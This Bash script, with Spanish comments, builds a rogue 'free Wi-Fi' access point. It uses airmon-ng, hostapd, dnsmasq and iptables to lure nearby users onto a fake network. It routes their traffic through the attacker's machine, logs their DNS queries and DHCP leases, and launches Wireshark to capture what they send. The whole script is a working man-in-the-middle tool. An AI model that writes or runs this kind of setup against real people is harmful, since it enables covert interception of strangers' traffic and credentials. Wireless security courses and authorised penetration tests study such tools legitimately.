#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# Funcion ctrl+c para cerrar el programa.
trap ctrl_c INT

function ctrl_c(){
  if [ -n "$pid" ]; then
  kill $pid
else
  echo -e "\n\n${yellowColour}[*]${endColour}${grayColour}Gnome-Terminal no está en ejecución.${endColour}"
fi
  echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} SALIENDO...Restableciando la red. :)\n${endColour}"
  echo 0 > /proc/sys/net/ipv4/ip_forward
	rm dnsmasq.conf hostapd.conf 2>/dev/null
	sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1.5
	iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1.5
	ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1.5
	tput cnorm; systemctl restart NetworkManager.service; sleep 2
	exit 0
}

# Condicion para ejecutar solo como usuario Root.
if [ "$(id -u)" != "0" ]; then
  echo -e "\n${grayColour}Es necesario ser${endColour}${redColour} 'ROOT'${endColour}${grayColour} o usar${endColour}${redColour} 'SUDO'${endColour}${grayColour} para ejecutarme.${endColour}"
  exit 1
fi
sleep 1
# Lista de programas requeridos
programas_requeridos=("wireshark" "hostapd" "dnsmasq" "aircrack-ng")

# Función para verificar si un programa está instalado
verificar_programa() {
    local programa="$1"
    if ! command -v "$programa" &>/dev/null; then
        read -p "\nEl programa '$programa' no está instalado. ¿Deseas instalarlo? (y/n): " respuesta
        if [[ "$respuesta" =~ ^[Yy] ]]; then
            # Puedes agregar aquí el comando de instalación adecuado para tu sistema
            echo -e "\n${yellowColour}[*]${endColour}${grayColour}Instalando ${endColour}${redColour} $programa${endColour}${grayColour}...${endColour}"
             sudo apt-get install "$programa"
        else
            echo -e "\n${yellowColour}[*]${endColour}${grayColour}No se ha instalado '$programa'. El script no puede continuar.${endColour}"
            exit 1
        fi
    fi
}

# Verificar cada programa requerido
for programa in "${programas_requeridos[@]}"; do
    verificar_programa "$programa"
done

# Si todos los programas requeridos están instalados o se han instalado, puedes continuar con el script.
echo -e "\n${yellowColour}[*]${endColour}${grayColour}Todos los programas requeridos están instalados. Continuando con el script...${endColour}"
sleep 1

# Pregunta por consola y Recoge input de usuario para configurar la wifi falsa.
echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre tarjeta de red a utilizar (Ej: wlan0mon):${endColour} " && read -r choosed_interface
echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: wifiGratis):${endColour} " && read -r use_ssid
echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel
echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n\n"
sleep 2
killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1 # Mata conextiones antes con haces nueva configuracion.
sleep 3

# Buscar interface wifi y ponerla en modo monitor
choosed_wifi=$(/usr/sbin/ifconfig | grep ^wlx | awk $'{print $1}' | tr -d ":")
airmon-ng start $choosed_wifi
sleep 1
ifconfig wlan0mon up
sleep 1

# Configuracion archivo "hostapd".
echo -e "interface=$choosed_interface\n" > hostapd.conf
echo -e "driver=nl80211\n" >> hostapd.conf
echo -e "ssid=$use_ssid\n" >> hostapd.conf
echo -e "hw_mode=g\n" >> hostapd.conf
echo -e "channel=$use_channel\n" >> hostapd.conf
echo -e "macaddr_acl=0\n" >> hostapd.conf
echo -e "auth_algs=1\n" >> hostapd.conf
echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf


echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz $choosed_interface${endColour}\n"
sleep 1

echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
sleep 1

gnome-terminal -- hostapd hostapd.conf & disown # Se ejecuta hostapd.conf en una nueva terminar para tener seguimiento de las conexiones entrantes.
pid=$(ps aux | grep "gnome-termina" | grep -v grep | awk '{print $2}')
sleep 1

wireshark 2>/devnull & disown

# Configuracion archivo "dnsmasq".
echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"
echo -e "interface=$choosed_interface\n" > dnsmasq.conf
echo -e "dhcp-range=10.0.0.10,10.0.0.25,255.255.255.0,12h\n" >> dnsmasq.conf
echo -e "dhcp-option=3,10.0.0.1\n" >> dnsmasq.conf
echo -e "dhcp-option=6,10.0.0.1\n" >> dnsmasq.conf
echo -e "server=8.8.8.8\n" >> dnsmasq.conf
echo -e "log-queries\n" >> dnsmasq.conf
echo -e "log-dhcp\n" >> dnsmasq.conf
echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf

ifconfig $choosed_interface 10.0.0.1 netmask 255.255.255.0
sleep 1
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
sleep 1
iptables --table nat --append POSTROUTING --out-interface eno1 -j MASQUERADE
sleep 1
iptables --append FORWARD --in-interface $choosed_interface -j ACCEPT
sleep 1
echo 1 > /proc/sys/net/ipv4/ip_forward
sleep 1 
dnsmasq -C dnsmasq.conf -d # Se ejecuta dnsmasq.conf en la misma terminal para hacer seguimiento.
